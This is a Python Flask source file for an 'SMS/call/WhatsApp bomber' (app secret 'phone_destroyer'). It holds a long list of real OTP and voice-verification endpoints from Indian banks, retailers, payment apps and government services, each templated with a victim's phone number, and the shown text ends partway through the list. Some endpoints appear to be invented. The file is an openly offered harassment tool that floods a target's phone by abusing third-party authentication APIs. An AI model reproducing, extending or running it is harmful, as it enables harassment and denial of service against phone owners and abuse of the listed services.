from flask import Flask, render_template, request, redirect, session, jsonify
import requests
import random
import json
import time
import os
from threading import Thread
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from urllib3.exceptions import InsecureRequestWarning

# SSL warnings ignore (Railway SSL issues ke liye)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

app = Flask(__name__)
app.secret_key = 'phone_destroyer_secret_key_2024'
app.config['SESSION_TYPE'] = 'filesystem'

# ============ COMPLETE 200+ APIS (EVERYTHING INCLUDED) ============
ULTIMATE_APIS = [
    # ==================== CALL BOMBING APIS (55+) ====================
    {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}'},
    {"name": "1MG Voice Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": '{"number":"{phone}","otp_on_call":true}'},
    {"name": "Swiggy Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Myntra Voice", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Flipkart Voice", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Amazon Voice", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": "phone={phone}&action=voice_otp"},
    {"name": "Paytm Voice", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Zomato Voice", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": "phone={phone}&type=voice"},
    {"name": "MakeMyTrip Voice", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Goibibo Voice", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Ola Voice", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Uber Voice", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Rapido Voice", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Oyo Voice", "url": "https://www.oyorooms.com/api/mobile/v5/user/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "PolicyBazaar Voice", "url": "https://api.policybazaar.com/user/v2/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Bajaj Finserv Voice", "url": "https://www.bajajfinserv.in/api/auth/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobileNumber":"{phone}"}'},
    {"name": "HDFC Bank Voice", "url": "https://www.hdfcbank.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "ICICI Bank Voice", "url": "https://www.icicibank.com/api/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "SBI Card Voice", "url": "https://www.sbicard.com/api/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Axis Bank Voice", "url": "https://www.axisbank.com/api/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobileNumber":"{phone}"}'},
    {"name": "Kotak Voice", "url": "https://www.kotak.com/api/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Yes Bank Voice", "url": "https://www.yesbank.in/api/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "IndusInd Voice", "url": "https://www.indusind.com/api/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "IDFC Voice", "url": "https://www.idfcbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Airtel Payments Bank", "url": "https://www.airtel.in/bank/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Jio Payments Bank", "url": "https://www.jiopaymentsbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "PhonePe Voice", "url": "https://api.phonepe.com/apis/hermes/otp/v1/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobileNumber":"{phone}"}'},
    {"name": "Google Pay Voice", "url": "https://pay.google.com/api/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Amazon Pay Voice", "url": "https://www.amazon.in/ap/phone/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phoneNumber":"{phone}"}'},
    {"name": "WhatsApp Voice", "url": "https://wa.me/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Telegram Voice", "url": "https://api.telegram.org/bot/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Signal Voice", "url": "https://signal.org/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Discord Voice", "url": "https://discord.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Snapchat Voice", "url": "https://snapchat.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Instagram Voice", "url": "https://www.instagram.com/api/v1/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone_number":"{phone}"}'},
    {"name": "Facebook Voice", "url": "https://www.facebook.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Twitter Voice", "url": "https://api.twitter.com/1.1/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "LinkedIn Voice", "url": "https://www.linkedin.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phoneNumber":"{phone}"}'},
    {"name": "Netflix Voice", "url": "https://www.netflix.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Hotstar Voice", "url": "https://www.hotstar.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Sony LIV Voice", "url": "https://www.sonyliv.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobileNumber":"{phone}"}'},
    {"name": "Zee5 Voice", "url": "https://www.zee5.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Voot Voice", "url": "https://www.voot.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "MX Player Voice", "url": "https://www.mxplayer.in/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "JioCinema Voice", "url": "https://www.jiocinema.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Airtel Xstream", "url": "https://www.airtelxstream.in/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Disney+ Voice", "url": "https://www.disneyplus.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "HBO Max Voice", "url": "https://www.hbomax.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phoneNumber":"{phone}"}'},
    {"name": "Apple TV Voice", "url": "https://tv.apple.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Prime Video Voice", "url": "https://www.primevideo.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "BookMyShow Voice", "url": "https://api.bookmyshow.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Paytm Insider Voice", "url": "https://insider.paytm.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Magicpin Voice", "url": "https://api.magicpin.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Dunzo Voice", "url": "https://api.dunzo.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Zepto Voice", "url": "https://api.zepto.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Blinkit Voice", "url": "https://api.blinkit.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Instamart Voice", "url": "https://instamart.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    
    # ==================== WHATSAPP BOMBING APIS (35+) ====================
    {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f"}, "data": '{"notification_channel":"WHATSAPP","phone_number":{"country_code":"+91","number":"{phone}"}}'},
    {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"user":{"phone_number":"+91{phone}"},"via":"whatsapp"}'},
    {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phoneNo":"{phone}"}'},
    {"name": "Jockey WhatsApp", "url": "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true", "method": "GET", "headers": {}, "data": None},
    {"name": "Rappi WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"country_code":"+91","phone":"{phone}"}'},
    {"name": "Eka Care WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"payload":{"allowWhatsapp":true,"mobile":"+91{phone}"},"type":"mobile"}'},
    {"name": "Flipkart WhatsApp", "url": "https://www.flipkart.com/api/3/user/whatsapp/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Amazon WhatsApp", "url": "https://www.amazon.in/ap/phone/whatsapp/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phoneNumber":"{phone}"}'},
    {"name": "Myntra WhatsApp", "url": "https://www.myntra.com/gw/mobile-auth/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Paytm WhatsApp", "url": "https://accounts.paytm.com/signin/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Zomato WhatsApp", "url": "https://www.zomato.com/php/whatsapp_otp.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": "phone={phone}&type=whatsapp"},
    {"name": "Swiggy WhatsApp", "url": "https://profile.swiggy.com/api/v3/app/request_whatsapp_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Ola WhatsApp", "url": "https://api.olacabs.com/v1/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Uber WhatsApp", "url": "https://auth.uber.com/v2/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Rapido WhatsApp", "url": "https://customer.rapido.bike/api/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Oyo WhatsApp", "url": "https://www.oyorooms.com/api/mobile/v5/user/whatsappOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "MakeMyTrip WhatsApp", "url": "https://www.makemytrip.com/api/4/whatsapp-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Goibibo WhatsApp", "url": "https://www.goibibo.com/user/whatsapp-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Lenskart WhatsApp", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendWhatsappOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phoneCode":"+91","telephone":"{phone}"}'},
    {"name": "NoBroker WhatsApp", "url": "https://www.nobroker.in/api/v3/account/otp/whatsapp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": "phone={phone}&countryCode=IN"},
    {"name": "PharmEasy WhatsApp", "url": "https://pharmeasy.in/api/v2/auth/send-whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Wakefit WhatsApp", "url": "https://api.wakefit.co/api/consumer-whatsapp-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Byju's WhatsApp", "url": "https://api.byjus.com/v2/otp/whatsapp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Cred WhatsApp", "url": "https://api.cred.club/api/auth/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Groww WhatsApp", "url": "https://api.groww.in/api/v1/auth/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Zerodha WhatsApp", "url": "https://kite.zerodha.com/api/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Upstox WhatsApp", "url": "https://api.upstox.com/v2/login/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Angel One WhatsApp", "url": "https://www.angelone.in/api/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "CoinSwitch WhatsApp", "url": "https://api.coinswitch.co/v2/auth/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "CoinDCX WhatsApp", "url": "https://api.coindcx.com/auth/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    
    # ==================== SMS BOMBING APIS (150+) ====================
    {"name": "Lenskart SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phoneCode":"+91","telephone":"{phone}"}'},
    {"name": "NoBroker SMS", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": "phone={phone}&countryCode=IN"},
    {"name": "PharmEasy SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Wakefit SMS", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Byju's SMS", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Hungama OTP", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobileNo":"{phone}","countryCode":"+91","appCode":"un"}'},
    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": "mobile_number={phone}"},
    {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone_number":"{phone}","language":"en"}'},
    {"name": "PenPencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}'},
    {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile_number":"+91{phone}"}'},
    {"name": "Dayco India", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": "api=send_otp&brand=dayco&mob={phone}"},
    {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}","city":362}'},
    {"name": "Lending Plate", "url": "https://lendingplate.com/api.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": "mobiles={phone}&resend=Resend"},
    {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobileNumber":"{phone}"}'},
    {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}","country":"in"}'},
    {"name": "NewMe", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile_number":"{phone}","resend_otp_request":true}'},
    {"name": "Univest", "url": "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}", "method": "GET", "headers": {}, "data": None},
    {"name": "Smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}","email":"test@example.com"}'},
    {"name": "CaratLane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"query":"mutation {SendOtp(input: {mobile: \"{phone}\",isdCode: \"91\"}) {status {message}}}"}'},
    {"name": "BikeFixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}'},
    {"name": "WellAcademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"contact_no":"{phone}"}'},
    {"name": "ServeTel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": "mobile_number={phone}"},
    {"name": "GoPink Cabs", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": "check_mobile_number=1&contact={phone}"},
    {"name": "Shemaroome", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": "mobile_no=%2B91{phone}"},
    {"name": "Cossouq", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": "mobilenumber={phone}&otptype=register"},
    {"name": "MyImagineStore", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": "mobile={phone}"},
    {"name": "Otpless", "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}","selectedCountryCode":"+91"}'},
    {"name": "MyHubble Money", "url": "https://api.myhubble.money/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phoneNumber":"{phone}","channel":"SMS"}'},
    {"name": "Tata Capital Business", "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobileNumber":"{phone}","deviceOs":"Android"}'},
    {"name": "DealShare", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}","hashCode":"k387IsBaTmn"}'},
    {"name": "Snapmint", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Housing.com", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}","country_url_name":"in"}'},
    {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}","app_signature":"wk+avHrHZf2"}'},
    {"name": "Netmeds", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Nykaa", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": "source=sms&mobile_number={phone}&platform=ANDROID"},
    {"name": "RummyCircle", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}","isPlaycircle":false}'},
    {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}'},
    {"name": "Entri", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}","version":"1.4.28"}'},
    {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}'},
    {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}","deviceType":"website"}'},
    {"name": "DeHaat", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}","client_id":"kisan-app"}'},
    {"name": "A23 Games", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}","device_id":"android123"}'},
    {"name": "Spencer's", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "PayMe India", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}","app_signature":"S10ePIIrbH3"}'},
    {"name": "Shopper's Stop", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}'},
    {"name": "Hyuga Auth", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "BigCash", "url": "https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1", "method": "GET", "headers": {"Referer": "https://www.bigcash.live/games/poker"}, "data": None},
    {"name": "Lifestyle Stores", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"signInMobile":"{phone}","channel":"sms"}'},
    {"name": "WorkIndia", "url": "https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623", "method": "GET", "headers": {}, "data": None},
    {"name": "PokerBaazi", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}","mfa_channels":"phno"}'},
    {"name": "My11Circle", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "MamaEarth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "HomeTriangle", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Wellness Forever", "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": 'method=firstRegisterApi&data={"customerMobile":"{phone}","generateOtp":"true"}'},
    {"name": "HealthMug", "url": "https://api.healthmug.com/account/createotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Vyapar", "url": "https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}", "method": "GET", "headers": {}, "data": None},
    {"name": "Kredily", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Tata Motors", "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}","sendOtp":"true"}'},
    {"name": "Moglix", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}","buildVersion":"24.0"}'},
    {"name": "MyGov", "url": "https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={phone}&gender=male", "method": "GET", "headers": {}, "data": None},
    {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}","locale":"IN"}'},
    {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}","hash_type":"play_store"}'},
    {"name": "CodFirm", "url": "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com", "method": "GET", "headers": {}, "data": None},
    {"name": "Swipe", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}","resend":true}'},
    {"name": "More Retail", "url": "https://omni-api.moreretail.in/api/v1/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}","hash_key":"XfsoCeXADQA"}'},
    {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}","platform":"Android","mode":"new_user"}'},
